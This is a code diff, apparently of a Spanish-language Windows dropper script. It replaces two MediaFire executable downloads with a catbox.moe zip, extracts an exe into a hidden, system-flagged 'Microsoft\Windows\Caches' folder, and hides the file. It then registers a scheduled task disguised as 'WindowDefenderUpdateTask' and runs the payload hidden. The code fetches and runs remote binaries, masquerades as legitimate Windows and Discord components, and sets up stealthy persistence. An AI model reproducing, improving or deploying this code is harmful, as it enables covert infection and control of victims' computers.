@@ -1,34 +1,53 @@
 import os
 import subprocess
 import urllib.request
+import zipfile
+import io
+import tempfile
 from pathlib import Path
 
-URL_PROGRAMA_1 = "https://download1320.mediafire.com/lst7uvprmxiglWQ-pnRr45VbrleWSXsuB3gNZyU6fGevf5VOj165eSdyWLPJoTOegHAjGuWgMagv345ID7WuEQWSYT5OSUiMNI2UHzHGINKFJv3F_1EKfLj8S7CXwmphf7uZmYqLESqXDw28Vup2r5u6NE3SifSAMWL-hIvkTVCwps0/0cppfbej9j5rw97/update.exe"
-URL_PROGRAMA_2 = "https://download1529.mediafire.com/om6vp4f6hj9gkkgYlEeul7dhnT95NEFXHYDGgupUXTxj5nqFFFnrrx691sf-psTWPQ-mKJsKefalQ6LHHEr8ns2m25kmA-bZxEDoXiTSiPQ0WCsVqH9b9VpVOlXRLgZ4wqNjHM4SVJhsMaQ63sBcJnmvLng3yrKeq8o1yZSsfmxs/c02qofa6vr09l6k/DiscordHookUpdater.exe"
+URL_ZIP_PROGRAMA = "https://files.catbox.moe/bwvxei.zip"
 
 DIRECTORIO_DISCRETO = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "Caches")
-DIRECTORIO_DISCORD_ESPECIFICO = os.path.join(
-    os.environ.get("LOCALAPPDATA", "C:\\"), 
-    "Discord", "app-1.0.9265", "modules", "discord_hook-1", "discord_hook", "6a2c449a768e5c"
-)
-
 RUTA_EXE_1 = os.path.join(DIRECTORIO_DISCRETO, "update.exe")
-RUTA_EXE_2 = os.path.join(DIRECTORIO_DISCORD_ESPECIFICO, "DiscordHookUpdater.exe")
 
-def descargar_archivo(url, destino):
+def descargar_y_extraer_zip(url, directorio_destino):
     try:
         headers = {"User-Agent": "Mozilla/5.0"}
         req = urllib.request.Request(url, headers=headers)
         
-        with urllib.request.urlopen(req, timeout=30) as response, open(destino, 'wb') as out_file:
-            while True:
-                chunk = response.read(16384)
-                if not chunk:
+        with urllib.request.urlopen(req, timeout=30) as response:
+            contenido_zip = response.read()
+            
+        ruta_temp_zip = os.path.join(tempfile.gettempdir(), "update_temp.zip")
+        with open(ruta_temp_zip, 'wb') as f:
+            f.write(contenido_zip)
+            
+        archivo_extraido = False
+        with zipfile.ZipFile(ruta_temp_zip, 'r') as zf:
+            for filename in zf.namelist():
+                if filename.endswith('.exe'):
+                    zf.extract(filename, directorio_destino)
+                    
+                    nombre_archivo_en_zip = os.path.basename(filename)
+                    ruta_extraida_real = os.path.join(directorio_destino, nombre_archivo_en_zip)
+                    
+                    if nombre_archivo_en_zip != "update.exe":
+                        ruta_final_deseada = os.path.join(directorio_destino, "update.exe")
+                        if os.path.exists(ruta_final_deseada):
+                            os.remove(ruta_final_deseada)
+                        os.rename(ruta_extraida_real, ruta_final_deseada)
+                        
+                    archivo_extraido = True
                     break
-                out_file.write(chunk)
-
-        subprocess.run(f'attrib +h "{destino}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return True
+                    
+        if os.path.exists(ruta_temp_zip):
+            os.remove(ruta_temp_zip)
+            
+        if archivo_extraido:
+            subprocess.run(f'attrib +h "{RUTA_EXE_1}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return True
+        return False
     except Exception as e:
         return False
 
@@ -57,16 +76,12 @@ if __name__ == "__main__":
         os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)
         subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    if not os.path.exists(DIRECTORIO_DISCORD_ESPECIFICO):
-        os.makedirs(DIRECTORIO_DISCORD_ESPECIFICO, exist_ok=True)
-
-    if descargar_archivo(URL_PROGRAMA_1, RUTA_EXE_1):
-        configurar_tarea("WindowDefenderUpdateTask", RUTA_EXE_1)
+    if os.path.exists(RUTA_EXE_1):
         ejecutar_oculto(RUTA_EXE_1)
-
-    if descargar_archivo(URL_PROGRAMA_2, RUTA_EXE_2):
-        configurar_tarea("DiscordHookMaintenanceTask", RUTA_EXE_2)
-        ejecutar_oculto(RUTA_EXE_2)
+    else:
+        if descargar_y_extraer_zip(URL_ZIP_PROGRAMA, DIRECTORIO_DISCRETO):
+            configurar_tarea("WindowDefenderUpdateTask", RUTA_EXE_1)
+            ejecutar_oculto(RUTA_EXE_1)
 
     try:
         ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
